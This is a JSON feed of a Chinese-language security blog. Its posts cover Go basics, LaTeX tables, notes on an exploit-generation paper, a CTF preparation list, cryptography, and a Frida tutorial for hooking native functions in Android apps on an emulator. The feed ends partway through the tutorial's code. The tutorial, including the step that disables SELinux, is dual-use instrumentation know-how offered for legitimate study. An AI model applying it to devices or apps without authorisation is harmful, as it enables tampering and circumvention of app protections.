{
    "version": "https://jsonfeed.org/version/1",
    "title": "alazymachine",
    "description": "",
    "home_page_url": "https://alazymechnaic.github.io",
    "items": [
        {
            "id": "https://alazymechnaic.github.io/2024/02/28/golang/",
            "url": "https://alazymechnaic.github.io/2024/02/28/golang/",
            "title": "Golang",
            "date_published": "2024-02-28T01:33:23.000Z",
            "content_html": "<h1 id=\"Go-语言安全实战\"><a href=\"#Go-语言安全实战\" class=\"headerlink\" title=\"Go 语言安全实战\"></a>Go 语言安全实战</h1><hr>\n<h2 id=\"Go语言编程\"><a href=\"#Go语言编程\" class=\"headerlink\" title=\"Go语言编程\"></a>Go语言编程</h2><h3 id=\"基础语法\"><a href=\"#基础语法\" class=\"headerlink\" title=\"基础语法\"></a>基础语法</h3><p>go语言本身是编译型语言，具备高效、简洁、并发能力强的特点，因此常常被用于云计算、网络服务。Go语言在执行的过程中，将Go代码转化为中间表示，并将程序的中间表示转化为目标平台的机器码。</p>\n<h4 id=\"hello-world\"><a href=\"#hello-world\" class=\"headerlink\" title=\"hello world\"></a>hello world</h4><pre><code class=\"go\">package main\nimport \"fmt\"\nfunc main() {\n    fmt.Printf(\"Congratulations! Go has successfully been installed on your system\\n\")\n}\n</code></pre>\n<p>运行代码</p>\n<pre><code class=\"bash\"> go run hello.go \n</code></pre>\n<p>拆分过程后进行代码的运行</p>\n<pre><code class=\"bash\"> go build -x hello.go  # 拆分过程实现，会产生一个名称为hello的二进制文件\n</code></pre>\n<p>通过gdb调试二进制文件能够看到go产生的中间语言。go语言在运行的过程中通过go的runtime与内核进行通信，runtime完成包括内存的分配等操作。</p>\n<p><img src=\"https://alazymechnaic.oss-cn-hangzhou.aliyuncs.com/blog-page/202402281041471.png\" alt=\"image-20240228104124390\"></p>\n<p>Go程序首次进入的函数是runtime.rt0_amd64，通过runtime.rt0_go函数调用main函数，并完成数据变量的初始化，CPU核心数量的获取以及全局变量m0、g0的设置。而后m0开启第一个线程。Go语言的runtime中存在优秀的线程管理机制，</p>\n<ul>\n<li>G：goroutine，⼀个计算任务。由需要执⾏的代码和其上下⽂组成，上下⽂包括：当前代码位置，栈顶、栈底地址，状态等。（协程）</li>\n<li>M：machine，系统线程，执⾏实体，想要在 CPU 上执⾏代码，必须有线程，与 C 语⾔中的线程相同，通过系统调⽤ clone 来创建。</li>\n<li>P：processor，虚拟处理器，M 必须获得 P 才能执⾏代码，否则必须陷⼊休眠(后台监控线程除外)，你也可以将其理解为⼀种 token，有这个 token，才有在物理 CPU 核⼼上执⾏的权⼒。</li>\n</ul>\n<p><a href=\"https://blog.csdn.net/qq_41000891/article/details/120463494\">https://blog.csdn.net/qq_41000891/article/details/120463494</a></p>\n<ul>\n<li>go语言的包声明和引入包有什么区别？</li>\n</ul>\n<p>go语言中的每一程序都至少包含一个名为main的包。并且package main必须在文件的第一个非注释行出现，表示该文件是程序的主函数。</p>\n<ul>\n<li>后面的为什么还要有一个main？</li>\n</ul>\n<p>package main用于指定程序首先寻找的文件，func main则用于指定首次执行的函数，如果存在init函数，则先执行init函数。</p>\n<h4 id=\"变量声明\"><a href=\"#变量声明\" class=\"headerlink\" title=\"变量声明\"></a>变量声明</h4><pre><code class=\"go\">var age int;\nage = 2\n//\nvar age = 2\n//\nage := 2\n</code></pre>\n<p>以上三种做法都可以实现对变量的声明。</p>\n<h4 id=\"指针操作\"><a href=\"#指针操作\" class=\"headerlink\" title=\"指针操作\"></a>指针操作</h4><pre><code class=\"go\">package main\nimport \"fmt\"\nfunc change(v *int) {\n    *v = 40\n}\nfunc main() {\n    a := 50 // 声明变量 a\n    b := &amp;a // 产生一个指向a的指针b\n    change(b) // 修改b指向内容的数据\n    fmt.Println(a) // 40\n}\n</code></pre>\n<p>在go语言中的指针操作与C语言类似，可以通过:=符号完成对变量的简单声明一个指针类型的变量。</p>\n<pre><code class=\"go\">package main\n\nimport \"fmt\"\n\nfunc change(v *int) {\n    *v = 40\n}\nfunc main() {\n    var(\n    a = [3]int{10,20,30}\n    ptr [3]*int\n    )\n\nfor i := 0; i&lt;len(a); i ++{\n    ptr[i] = &amp;a[i]\n    fmt.Printf(\"%d 0x%x\\n\",i+1, ptr[i])\n}\nfmt.Println(ptr[0]+1) // 报错：invalid operation: ptr[0] + 1 (mismatched types *int and int)\n}\n</code></pre>\n<p>在上述过程中能够看到，Go语言只能对程序中的int*类型的变量做解引用操作，且与C语言不同，指针本身并不能像数值一样直接运算。</p>\n<pre><code class=\"go\">package main\n\nimport \"fmt\"\n// import \"unsafe\"\nfunc change(v *int) {\n    *v = 40\n}\nfunc main() {\n    var(\n    a = [3]int{10,20,30}\n    ptr [3]*int\n    )\n\nfor i := 0; i&lt;len(a); i ++{\n    ptr[i] = &amp;a[i]\n    fmt.Printf(\"%d 0x%x\\n\",i+1, ptr[i])\n}\nfmt.Println(*ptr[0])\nintVal := int(uintptr(unsafe.Pointer(ptr[0])))\nintVal += 8\nptr2 := (*int)(unsafe.Pointer(uintptr(intVal)))\nfmt.Println(*(ptr2)) // 报错 unsafe\n}\n</code></pre>\n<p>由于Go语言的特性，直接读取给定地址的内容是不允许的，因为Go语言具有内存安全性和类型安全性的限制。Go语言的内存访问是受限制的，不能直接操纵指针或进行低级别的内存操作。直接将数字转化为指针是不安全的，因此编译都不会通过。</p>\n<h3 id=\"似乎可以利用的点\"><a href=\"#似乎可以利用的点\" class=\"headerlink\" title=\"似乎可以利用的点\"></a>似乎可以利用的点</h3><p>Go语言中如果将代码写在同一行是没问题的，但是需要使用分号隔开。在进行模本注入的过程中可以考虑使用该方法。\t</p>\n<h2 id=\"Go语言的安全问题\"><a href=\"#Go语言的安全问题\" class=\"headerlink\" title=\"Go语言的安全问题\"></a>Go语言的安全问题</h2><h3 id=\"模板注入\"><a href=\"#模板注入\" class=\"headerlink\" title=\"模板注入\"></a>模板注入</h3><h3 id=\"XSS\"><a href=\"#XSS\" class=\"headerlink\" title=\"XSS\"></a>XSS</h3><h3 id=\"命令执行\"><a href=\"#命令执行\" class=\"headerlink\" title=\"命令执行\"></a>命令执行</h3><h3 id=\"任意文件读取\"><a href=\"#任意文件读取\" class=\"headerlink\" title=\"任意文件读取\"></a>任意文件读取</h3><h2 id=\"Go语言漏洞\"><a href=\"#Go语言漏洞\" class=\"headerlink\" title=\"Go语言漏洞\"></a>Go语言漏洞</h2><p><a href=\"https://pkg.go.dev/vuln/list\">https://pkg.go.dev/vuln/list</a></p>\n",
            "tags": [
                "go"
            ]
        },
        {
            "id": "https://alazymechnaic.github.io/2024/01/07/overleaf/",
            "url": "https://alazymechnaic.github.io/2024/01/07/overleaf/",
            "title": "overleaf",
            "date_published": "2024-01-07T07:52:13.000Z",
            "content_html": "<h1 id=\"Overleaf\"><a href=\"#Overleaf\" class=\"headerlink\" title=\"Overleaf\"></a>Overleaf</h1><hr>\n<h2 id=\"表格\"><a href=\"#表格\" class=\"headerlink\" title=\"表格\"></a>表格</h2><p>插入表格并且让其占据两栏</p>\n<pre><code class=\"latex\">\\usepackage{stfloats}\n\\begin{table*}[ht]\n    % 插入长度为5pt的垂直空间（也可以是负数，缩进）\n    \\vspace{5pt}\n    \\centering\n    % 表名 前面为中文名/后面为英文名\n    \\caption{Total Number Display Table}\n    % label标签，用以引用本表时。例：autoref{num}\n    \\label{num}\n    % 设置表格单元格的列宽\n    \\setlength{\\tabcolsep}{6mm}{\n    % 表示 三线表 有4列\n    \\begin{tabular}{cccc}\n    % toprule表示三线表的顶部线\n        \\toprule\n        Program &amp; CVE &amp; Primitive Location  &amp; Number of Tainted instructions \\\\\n        % midrule 表示 三线表的 中部线\n        \\midrule\n        % 合并三行1列，用空格代替，也可以用\\multirow{}[]{}{}来表示\n        \\textbf{Gstreamer}  &amp; b  &amp; 10   &amp; b \\\\\n        \\textbf{ }    &amp; 1   &amp; 1   &amp; 1   \\\\\n        \\textbf{ }    &amp; 1    &amp; 1   &amp; 1   \\\\\n   \n        \\textbf{latex2rtf}  &amp; 1     &amp; 2  &amp; 1  \\\\\n        \\textbf{ }    &amp; 1       &amp; 3  &amp; 1  \\\\\n        \\textbf{ }    &amp; 1       &amp; 1  &amp; 1   \\\\  \n        \\textbf{ }    &amp; 1       &amp; 1  &amp; 1   \\\\ \n    \n        \\textbf{nginx}  &amp; 1     &amp; 30   &amp; 1   \\\\  \n        \\textbf{ }    &amp; 1   &amp; 50   &amp; 1  \\\\\n        \\textbf{ }    &amp; 1     &amp; 100  &amp; 1 \\\\\n        \\textbf{ }    &amp; 1     &amp; 80   &amp; 1  \\\\\n        \\textbf{ }    &amp; 1     &amp; 40   &amp; 1  \\\\\n        \n        \\textbf{ALL}       &amp; dd      &amp; dd     &amp; ddd \\\\\n        % bottomrule表示 三线表 的底部线\n        \\bottomrule \n    \\end{tabular}}\n\\end{table*}\n</code></pre>\n",
            "tags": [
                "writing"
            ]
        },
        {
            "id": "https://alazymechnaic.github.io/2023/12/26/latex-overleaf/",
            "url": "https://alazymechnaic.github.io/2023/12/26/latex-overleaf/",
            "title": "latex-overleaf",
            "date_published": "2023-12-25T16:07:15.000Z",
            "content_html": "",
            "tags": []
        },
        {
            "id": "https://alazymechnaic.github.io/2023/12/03/paper-tunter/",
            "url": "https://alazymechnaic.github.io/2023/12/03/paper-tunter/",
            "title": "paper_tunter",
            "date_published": "2023-12-03T05:15:08.000Z",
            "content_html": "<h2 id=\"Tunter-Assessing-Exploitability-of-Vulnerabilities-with-Taint-Guided-Exploitable-States-Exploration\"><a href=\"#Tunter-Assessing-Exploitability-of-Vulnerabilities-with-Taint-Guided-Exploitable-States-Exploration\" class=\"headerlink\" title=\"Tunter: Assessing Exploitability of Vulnerabilities with Taint-Guided Exploitable States Exploration\"></a>Tunter: Assessing Exploitability of Vulnerabilities with Taint-Guided Exploitable States Exploration</h2><hr>\n<h3 id=\"主要贡献点\"><a href=\"#主要贡献点\" class=\"headerlink\" title=\"主要贡献点\"></a>主要贡献点</h3><ul>\n<li>基于污点分析的候选exploit状态探索策略</li>\n<li>用户缓解搜索状态爆照的剪枝策略</li>\n<li><strong>在14个CTF上，2个real world上测试</strong>，在Revery上的测试比其更快但是并没有找全面</li>\n</ul>\n<h3 id=\"关键思想\"><a href=\"#关键思想\" class=\"headerlink\" title=\"关键思想\"></a>关键思想</h3><ul>\n<li>一旦发生内存错误就会导致程序变为一个奇怪的状态机，发现exploit的本质是搜索这个状态机中的空间，<strong>但是搜索这该状态空间是十分耗时的</strong></li>\n<li>文章指出的问题<ul>\n<li>使用符号执行进行求解只能对小型的程序起作用，对于大一点的程序会直接路径爆炸（<strong>但是这个我们解决了，使用启发式的路径探索策略，有目标的进行探索和评估</strong></li>\n<li>对于fuzz的使用，Revery使用fuzz的方式进行可利用状态的探索，太耗时</li>\n</ul>\n</li>\n<li>使用启发式的状态剪枝方法来防止状态爆炸，构造目标可利用状态的约束</li>\n</ul>\n<h3 id=\"相似之处\"><a href=\"#相似之处\" class=\"headerlink\" title=\"相似之处\"></a>相似之处</h3><ul>\n<li>都是使用污点分析标记受污染的内存，在传播的过程中找到受影响的sink（例如，memcpy参数，ret地址等），作为候选的状态</li>\n<li>使用动静转换策略，找到程序漏洞的触发位置，将动态执行的状态转换为静态执行的状态，从静态位置开始进行污点分析，<strong>这一部分与我们的方法一致</strong>，但是并没有完全的dump内存，而是模拟了一个相似的静态程序状态</li>\n<li>数据流分析时的指针问题，因为rax可控，所以直接将rsi定义为可控，在下面的指令中mov [rsi],rbx就认为是个gadget，<strong>我们也是这么做的。。。，但是不同之处在于后续进行求解的过程中会在数据流分析中施加内存搜索策略</strong><ul>\n<li><img data-src=\"/paper-tunter.assets/image-20231203144731837.png\" alt=\"image-20231203144731837\"></li>\n</ul>\n</li>\n</ul>\n<h3 id=\"主要的问题\"><a href=\"#主要的问题\" class=\"headerlink\" title=\"主要的问题\"></a>主要的问题</h3><ul>\n<li><p>所有的案例都是在CTF上进行实现，两个真实世界的案例，构造了一个Revery无法进行实现的案例的exp，且多数攻击都是通过改变控制流实现的，</p>\n</li>\n<li><p>行文中更多的是像对Revery研究的补充，而并非是一篇独立的文章，并且在比较结果上并没有比Revery好多少</p>\n</li>\n<li><p>文章对漏洞的理解，将内存错误视为对程序原有状态机的改变，我们认为内存错误的本质是对合法数据流依赖关系的破坏</p>\n</li>\n<li><p>文章中通过控制流劫持的方法进行攻击，我们使用的是满足控制流完整性的方式进行攻击，限制条件更多，<strong>后面的实验最好能找到原本没有，算法构造出的</strong></p>\n</li>\n<li><p>污点分析找路径时的爆炸问题并没有进行考虑，而我们使用启发式的路径排序策略，缓解了这一问题（他是用修剪不相关路径实现的？</p>\n</li>\n<li><p><strong>符号执行的路径修剪策略潦草</strong>：其实就是在指定了路径后去求解，出现循环太多次的就剪掉，这一部分工程实现讲得有点多</p>\n</li>\n<li><p>调研量过少，涉及到的AEG部分内容理解不完善</p>\n</li>\n<li><p><strong>我们的优势在于保证所有保护开启的情况下完成的攻击，该文章则是在保护全关的情况下进行利用</strong></p>\n</li>\n<li><p>对于精准的内存地址，没有办法做到求解，page 9</p>\n<ul>\n<li><img data-src=\"/paper-tunter.assets/image-20231203150112918.png\" alt=\"image-20231203150112918\"></li>\n</ul>\n</li>\n<li><p>angr的求解问题，并不能做到精准的求解</p>\n<ul>\n<li><img data-src=\"/paper-tunter.assets/image-20231203150421157.png\" alt=\"image-20231203150421157\"></li>\n</ul>\n</li>\n</ul>\n",
            "tags": [
                "paper"
            ]
        },
        {
            "id": "https://alazymechnaic.github.io/2023/10/18/awd-plus/",
            "url": "https://alazymechnaic.github.io/2023/10/18/awd-plus/",
            "title": "AWD_plus",
            "date_published": "2023-10-18T13:21:55.000Z",
            "content_html": "<h2 id=\"技能树\"><a href=\"#技能树\" class=\"headerlink\" title=\"技能树\"></a>技能树</h2><h3 id=\"防御准备\"><a href=\"#防御准备\" class=\"headerlink\" title=\"防御准备\"></a>防御准备</h3><ul>\n<li>PHP,JSP,Python网站会搭建，代码能看懂，安全函数，过滤函数会用</li>\n<li>常见的漏洞exp模式了解清楚，知道过滤方式</li>\n</ul>\n<h3 id=\"攻击准备\"><a href=\"#攻击准备\" class=\"headerlink\" title=\"攻击准备\"></a>攻击准备</h3><ul>\n<li>抓取流量的脚本，截取服务器的exp</li>\n<li>那岂不是自己看到源码就可以进行攻击了？</li>\n</ul>\n<h3 id=\"渗透准备\"><a href=\"#渗透准备\" class=\"headerlink\" title=\"渗透准备\"></a>渗透准备</h3><ul>\n<li>常见工具的使用</li>\n<li>常见渗透思路</li>\n</ul>\n",
            "tags": [
                "AWD"
            ]
        },
        {
            "id": "https://alazymechnaic.github.io/2023/10/17/cipher/",
            "url": "https://alazymechnaic.github.io/2023/10/17/cipher/",
            "title": "cipher",
            "date_published": "2023-10-17T07:58:44.000Z",
            "content_html": "<h3 id=\"双线性对的概念\"><a href=\"#双线性对的概念\" class=\"headerlink\" title=\"双线性对的概念\"></a>双线性对的概念</h3><p>​\t<strong>群</strong>：</p>\n<p><img data-src=\"https://alazymechnaic.oss-cn-hangzhou.aliyuncs.com/blog-page/202310171559441.png\" alt=\"image-20231017155853356\"></p>\n<p>​\t关于群的<strong>阶数</strong>，其实就是群的个数：</p>\n<p><img data-src=\"https://alazymechnaic.oss-cn-hangzhou.aliyuncs.com/blog-page/202310171601969.png\" alt=\"image-20231017160100932\"></p>\n<p>​\t<strong>生成元</strong>：生成元能够不断对自己做群中所定义的运算最终生成群中的任意一个元素。</p>\n<p>​\t<strong>线性空间</strong>：</p>\n<p><img data-src=\"https://alazymechnaic.oss-cn-hangzhou.aliyuncs.com/blog-page/202310171610549.png\" alt=\"image-20231017161030484\"></p>\n<p>​\t<strong>双线性函数</strong>的定义：</p>\n<p><img data-src=\"https://alazymechnaic.oss-cn-hangzhou.aliyuncs.com/blog-page/202310171608972.png\" alt=\"image-20231017160834934\"></p>\n",
            "tags": []
        },
        {
            "id": "https://alazymechnaic.github.io/2023/10/16/thresholdsignature/",
            "url": "https://alazymechnaic.github.io/2023/10/16/thresholdsignature/",
            "title": "thresholdsignature",
            "date_published": "2023-10-16T12:27:04.000Z",
            "content_html": "<h2 id=\"ProvablySecureThresholdSignatureSchemesWithoutRandom-Oracles-论文阅读\"><a href=\"#ProvablySecureThresholdSignatureSchemesWithoutRandom-Oracles-论文阅读\" class=\"headerlink\" title=\"ProvablySecureThresholdSignatureSchemesWithoutRandom Oracles  论文阅读\"></a>ProvablySecureThresholdSignatureSchemesWithoutRandom Oracles  论文阅读</h2><hr>\n<p>门限签名的目的是避免产生可信中心，只有超过t个用户才能在一起验证签名或者产生有效的计算过程。</p>\n",
            "tags": [
                "cipher"
            ]
        },
        {
            "id": "https://alazymechnaic.github.io/2023/10/07/dfanalyzer/",
            "url": "https://alazymechnaic.github.io/2023/10/07/dfanalyzer/",
            "title": "DfAnalyzer",
            "date_published": "2023-10-07T01:32:51.000Z",
            "content_html": "<h1 id=\"DfAnalyzer-Runtime-dataflow-analysis-tool-for-Computational-Science-and-Engineering-applications\"><a href=\"#DfAnalyzer-Runtime-dataflow-analysis-tool-for-Computational-Science-and-Engineering-applications\" class=\"headerlink\" title=\"DfAnalyzer: Runtime dataflow analysis tool for Computational Science and Engineering applications\"></a>DfAnalyzer: Runtime dataflow analysis tool for Computational Science and Engineering applications</h1><hr>\n",
            "tags": [
                "paper"
            ]
        },
        {
            "id": "https://alazymechnaic.github.io/2023/10/03/frida-hook/",
            "url": "https://alazymechnaic.github.io/2023/10/03/frida-hook/",
            "title": "frida-hook",
            "date_published": "2023-10-03T11:03:18.000Z",
            "content_html": "<h1 id=\"Frida-hook实战\"><a href=\"#Frida-hook实战\" class=\"headerlink\" title=\"Frida hook实战\"></a>Frida hook实战</h1><hr>\n<p>本文记录frida在Windows上的使用过程。代码出处位于参考链接中。</p>\n<h2 id=\"安装\"><a href=\"#安装\" class=\"headerlink\" title=\"安装\"></a>安装</h2><p>安装Python的frida模块：</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">pip <span class=\"token function\">install</span> frida-tools\npip <span class=\"token function\">install</span> frida<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p>首先下载frida的server：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2ZyaWRhL2ZyaWRhL3JlbGVhc2VzL2Rvd25sb2FkLzE2LjEuNC9mcmlkYS1zZXJ2ZXItMTYuMS40LWFuZHJvaWQteDg2XzY0Lnh6\">https://github.com/frida/frida/releases/download/16.1.4/frida-server-16.1.4-android-x86_64.xz</span></p>\n<p>安装frida-server</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">adb push frida-server /data/local/tmp/frida-server\nadb shell <span class=\"token function\">chmod</span> <span class=\"token number\">777</span> /data/local/tmp/frida-server\t\n<span class=\"token comment\"># 而后启动</span>\n/data/local/tmp/frida-server\n frida-ps <span class=\"token parameter variable\">-U</span> <span class=\"token comment\"># 该指令执行过后能够看到在运行的frida-server</span>\n frida-ls-devices <span class=\"token comment\"># 查看当前的设备</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><img data-src=\"https://alazymechnaic.oss-cn-hangzhou.aliyuncs.com/blog-page/202310031921608.png\" alt=\"image-20231003192150554\"></p>\n<p>还需要保证 selinux 是关闭的状态，可以在 adb shell 里，su - 获得 root 权限之后，输入 setenforce 0 命令来获得。</p>\n<h3 id=\"adb常用指令\"><a href=\"#adb常用指令\" class=\"headerlink\" title=\"adb常用指令\"></a>adb常用指令</h3><pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">adb devices <span class=\"token comment\"># 列出当前已经连接的安卓设备</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img data-src=\"https://alazymechnaic.oss-cn-hangzhou.aliyuncs.com/blog-page/202310031916069.png\" alt=\"image-20231003191603976\"></p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">adb <span class=\"token parameter variable\">-s</span> <span class=\"token operator\">&lt;</span>device_id<span class=\"token operator\">&gt;</span> shell <span class=\"token comment\"># 这里可以使用adb -s 127.0.0.1:5555 shell 连接</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h2 id=\"Frida-Hook-Native脚本编写\"><a href=\"#Frida-Hook-Native脚本编写\" class=\"headerlink\" title=\"Frida Hook Native脚本编写\"></a>Frida Hook Native脚本编写</h2><p>脚本运行指令</p>\n<pre class=\"line-numbers language-powershell\" data-language=\"powershell\"><code class=\"language-powershell\">frida <span class=\"token operator\">-</span>U <span class=\"token operator\">-</span>f &lt;com<span class=\"token punctuation\">.</span>example<span class=\"token punctuation\">.</span>x86demo 需要加载的包名&gt; <span class=\"token operator\">-</span>l &lt;hook<span class=\"token punctuation\">.</span>js 本次运行的脚本&gt;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>当然也可以使用python的脚本运行，但是不推荐，看不到js代码中的报错</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">import</span> frida\n<span class=\"token keyword\">import</span> sys\n<span class=\"token comment\"># 定义目标应用程序的包名和目标函数名</span>\ntarget_package_name <span class=\"token operator\">=</span> <span class=\"token string\">'com.example.x86demo'</span>\ntarget_function_name <span class=\"token operator\">=</span> <span class=\"token string\">'Java_com_example_x86demo_MainActivity_stringFromJNI'</span> <span class=\"token comment\"># 这里注意使用的函数名称一定是以Java为开头的函数</span>\n\n\n<span class=\"token comment\"># 创建Frida会话并附加到目标应用程序</span>\ndevice <span class=\"token operator\">=</span> frida<span class=\"token punctuation\">.</span>get_device<span class=\"token punctuation\">(</span><span class=\"token string\">'emulator-5554'</span><span class=\"token punctuation\">)</span>\npid <span class=\"token operator\">=</span> device<span class=\"token punctuation\">.</span>spawn<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span>target_package_name<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\nsession <span class=\"token operator\">=</span> device<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>pid<span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># device.resume(pid)</span>\n\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">on_message</span><span class=\"token punctuation\">(</span>message<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">if</span> message<span class=\"token punctuation\">[</span><span class=\"token string\">'type'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token string\">'send'</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"[*] {0}\"</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>message<span class=\"token punctuation\">[</span><span class=\"token string\">'payload'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>message<span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\"># 创建Native层Hook</span>\nscript <span class=\"token operator\">=</span> session<span class=\"token punctuation\">.</span>create_script<span class=\"token punctuation\">(</span><span class=\"token triple-quoted-string string\">\"\"\"\nJava.perform(() =&gt; {\n\t// 这里写js脚本\n})           \n\"\"\"</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\"># 注册Hook回调函数</span>\nscript<span class=\"token punctuation\">.</span>on<span class=\"token punctuation\">(</span><span class=\"token string\">'message'</span><span class=\"token punctuation\">,</span> on_message<span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\"># 加载并运行Hook脚本</span>\nscript<span class=\"token punctuation\">.</span>load<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># 保持脚本运行</span>\n<span class=\"token builtin\">input</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Press any key to exit...\"</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"获取so基地址\"><a href=\"#获取so基地址\" class=\"headerlink\" title=\"获取so基地址\"></a>获取so基地址</h3><pre class=\"line-numbers language-javascript\" data-language=\"javascript\"><code class=\"language-javascript\"><span class=\"token keyword\">function</span> <span class=\"token function\">hookBaseAddress</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">const</span> address <span class=\"token operator\">=</span> Module<span class=\"token punctuation\">.</span><span class=\"token function\">findBaseAddress</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"libnative-lib.so\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>address<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>address<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//这里我获取到的是 0xb8f91000</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n\n\n<h3 id=\"查看native层内容\"><a href=\"#查看native层内容\" class=\"headerlink\" title=\"查看native层内容\"></a>查看native层内容</h3><pre class=\"line-numbers language-javascript\" data-language=\"javascript\"><code class=\"language-javascript\"><span class=\"token comment\">// 枚举native层函数</span>\n<span class=\"token keyword\">function</span> <span class=\"token function\">hookImEx</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"以下是导入函数：\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">var</span> importMethods <span class=\"token operator\">=</span> Module<span class=\"token punctuation\">.</span><span class=\"token function\">enumerateImports</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"libnative-lib.so\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">let</span> index <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> index <span class=\"token operator\">&lt;</span> importMethods<span class=\"token punctuation\">.</span>length<span class=\"token punctuation\">;</span> index<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">const</span> element <span class=\"token operator\">=</span> importMethods<span class=\"token punctuation\">[</span>index<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n        console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token constant\">JSON</span><span class=\"token punctuation\">.</span><span class=\"token function\">stringify</span><span class=\"token punctuation\">(</span>element<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"以下是导出函数：\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">var</span> exportMethods <span class=\"token operator\">=</span> Module<span class=\"token punctuation\">.</span><span class=\"token function\">enumerateExports</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"libnative-lib.so\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">let</span> index <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> index <span class=\"token operator\">&lt;</span> exportMethods<span class=\"token punctuation\">.</span>length<span class=\"token punctuation\">;</span> index<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">const</span> element <span class=\"token operator\">=</span> exportMethods<span class=\"token punctuation\">[</span>index<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n        console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token constant\">JSON</span><span class=\"token punctuation\">.</span><span class=\"token function\">stringify</span><span class=\"token punctuation\">(</span>element<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token comment\">// 查看native层的调用结果</span>\n<span class=\"token keyword\">function</span> <span class=\"token function\">hookByName</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">const</span> address <span class=\"token operator\">=</span> Module<span class=\"token punctuation\">.</span><span class=\"token function\">findExportByName</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"libnative-lib.so\"</span><span class=\"token punctuation\">,</span> <span class=\"token 